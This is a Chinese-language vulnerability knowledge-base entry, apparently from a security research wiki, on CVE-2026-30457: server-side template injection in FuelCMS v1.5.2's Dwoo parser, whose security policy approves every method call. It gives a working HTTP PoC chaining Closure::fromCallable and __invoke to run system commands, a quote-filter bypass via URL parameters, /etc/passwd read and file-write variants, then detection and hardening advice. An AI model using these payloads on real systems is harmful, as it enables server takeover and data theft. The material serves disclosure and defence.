---
id: web-generic-ssti-dwoo-security-policy-empty-rce
title: FuelCMS Dwoo 安全策略空实现：Closure::fromCallable 链式调用绕过沙箱执行命令
type: scenario
domain: web
path: web/generic/ssti
technique: dwoo-security-policy-bypass
tags:
- ssti
- php
- dwoo
- fuelcms
- sandbox-bypass
- closure
- rce
- cve
cve:
- CVE-2026-30457
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V30
  verified_at: '2026-11-05T03:19:35+08:00'
  notes: 已对照原文与3张截图核对MY_Security_Policy空实现/Closure::fromCallable链/.get零引号Payload；图03显示id输出uid=0(root)，RCE已证；需后台会话，非未授权；未执行PoC
url: /docs/web/generic/ssti/web-generic-ssti-dwoo-security-policy-empty-rce/
draft: false
kb_aliases:
- CVE-2026-30457
- Dwoo SSTI
- FuelCMS Dwoo RCE
- MY_Security_Policy 绕过
- Closure::fromCallable 模板注入
- Dwoo isMethodAllowed return TRUE
---

## 一句话结论

FuelCMS v1.5.2 的 Dwoo 解析器继承了 `Dwoo_Security_Policy`，却把 `isMethodAllowed()` 实现为恒返回 `TRUE`、把 `callMethod()` 实现为直接 `call_user_func_array()`；攻击者登录后台后在 `/fuel/preview` 提交 `{Closure::fromCallable($dwoo.get.f)->__invoke($dwoo.get.c)}`，即可绕过 `allowedPhpFunctions` 白名单执行任意系统命令。

## 原理

- Dwoo 的安全策略类负责两件事：`isMethodAllowed($class, $method)` 判断模板是否允许调用某个类方法；`callMethod()` 在允许后执行实际调用。正常实现应做类×方法白名单校验，未命中则抛出安全异常。
- FuelCMS 的 `MY_Security_Policy`（`fuel/modules/fuel/libraries/parser/Fuel_dwoo_parser.php`）把前者写成 `return TRUE`，后者写成 `return call_user_func_array(array($obj, $method), $args)`。两个检查同时失效，等于没有沙箱。
- Dwoo 编译器遇到 `{Class::staticMethod(...)}` 这类含 `::` 的调用时，会走特殊分支：先调用 `isMethodAllowed()`，通过后把插件类型标记为 `Dwoo::NATIVE_PLUGIN`，直接生成原生 PHP 调用。由于 `isMethodAllowed()` 恒真，任何静态方法调用都不会再经过 `allowedPhpFunctions` 白名单。
- `Closure::fromCallable("system")` 是 PHP 7.1+ 的静态方法，返回一个绑定到 `system` 的 Closure 对象；随后 `->__invoke("whoami")` 调用该 Closure，等价于 `system("whoami")`。Dwoo 对链式方法调用同样走 `callMethod()`，直接透传执行。
- 编译后的 PHP 大致为 `callMethod($this, Closure::fromCallable("system"), "__invoke", array("whoami"))`，最终落到 `system("whoami")`。
- 引号绕过：FuelCMS 用 CodeIgniter 的 `get_post('data', TRUE)` 读取模板内容，第二个参数 `TRUE` 会做 XSS 过滤，把单/双引号编码成 HTML 实体。直接写 `Closure::fromCallable("system")` 会被破坏；改用 Dwoo 的 `$dwoo.get.f` 从 URL 查询参数取值，模板中不出现引号，从而绕过过滤。

## 触发条件

- FuelCMS v1.5.2（原文复现环境），Dwoo 解析器与 `/fuel/preview` 功能启用，且使用存在缺陷的 `MY_Security_Policy`。
- 攻击者能登录后台（原文使用默认 `admin/admin`），或已获得可用会话；该漏洞不是未授权入口。
- PHP 版本支持 `Closure::fromCallable`（PHP 7.1+，原文为 7.1）。
- `system` 等函数未被 `disable_functions` 禁用，Web 进程权限决定命令执行的影响范围。
- `/fuel/preview` 可接收用户提交的模板内容（`data` 参数）并交给 Dwoo 渲染。

## 利用步骤

1. 访问 `/fuel/login`，用默认或已获取的凭据登录，取得 `ci_session` Cookie。
2. 确认 `/fuel/preview` 可用，且请求体中的 `data` 会作为 Dwoo 模板渲染。
3. 将命令与函数名放到 URL 查询参数中：`?f=system&c=whoami`。
4. POST `data={Closure::fromCallable($dwoo.get.f)->__invoke($dwoo.get.c)}&preview=_fuel_preview`，携带登录 Cookie。
5. 响应中的预览内容会包含命令输出；将 `c` 换成 `id`、`uname -a`、`ls -la /` 等验证权限。
6. 文件读取变体：`?f=/etc/passwd` + `{Closure::fromCallable(file_get_contents)->__invoke($dwoo.get.f)}`；写入变体同理使用 `file_put_contents`。

## PoC

```http
POST /fuel/preview?f=system&c=id HTTP/1.1
Host: 127.0.0.1:9980
Cookie: ci_session=<登录后的 session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 86

data={Closure::fromCallable($dwoo.get.f)->__invoke($dwoo.get.c)}&preview=_fuel_preview
```

```text
预览响应中出现：
uid=0(root) gid=0(root) groups=0(root)
```

文件读取：

```http
POST /fuel/preview?f=/etc/passwd HTTP/1.1
...
data={Closure::fromCallable(file_get_contents)->__invoke($dwoo.get.f)}&preview=_fuel_preview
```

## 变体与关联

- 变体：把 `system` 换成 `exec`、`shell_exec`、`passthru` 等；把 `file_get_contents`/`file_put_contents` 换成任意 PHP 函数，取决于 `disable_functions`。
- 变体：如果目标不做引号过滤，可直接写 `{Closure::fromCallable("system")->__invoke("id")}`，无需 `$dwoo.get`。
- 关联：Pimcore CMS 的 Twig 沙箱（CVE-2026-11407）存在同类“`checkMethodAllowed()`/`checkPropertyAllowed()` 空实现”缺陷，属于同一模式。
- 关联：[[web-generic-ssti-smarty-direct-rce-v4-v5-bypass]]、[[web-generic-ssti-twig-filter-map-reduce-callback-rce]] 是其他 PHP 模板引擎的沙箱绕过。
- 边界：需要后台会话；若 `disable_functions` 禁用 `system` 等函数、或 Dwoo 安全策略已实现白名单，则该链不成立。

## 检测与防御

- **检测（代码）**：搜索 `isMethodAllowed`、`callMethod`、`checkMethodAllowed` 的实现，重点看 `return TRUE`、空函数体、直接 `call_user_func_array`；Dwoo/FuelCMS 中检查 `Fuel_dwoo_parser.php` 的 `MY_Security_Policy`。
- **检测（请求）**：`/fuel/preview` 的 `data` 中出现 `::`、`Closure::fromCallable`、`__invoke`、`$dwoo.get`、`file_get_contents`、`file_put_contents` 等模板注入特征；URL 参数被模板变量直接引用。
- **检测（主机）**：Web 进程（尤其是 root）派生 `id`、`whoami`、`uname` 等子进程；Web 目录出现新 PHP 文件。
- **修复**：实现真正的类×方法白名单；`callMethod()` 执行前再次校验；`setPhpHandling()` 使用 `Dwoo_Security_Policy::PHP_REMOVE` 而非 `PHP_ENCODE`；升级到含修复的 FuelCMS/Dwoo 版本。
- **加固**：限制 `/fuel/preview` 的访问（仅管理员、内网或禁用）；修改默认 `admin/admin`；以低权限运行 Web 进程；禁用不必要的危险函数；WAF 检测模板注入 payload。
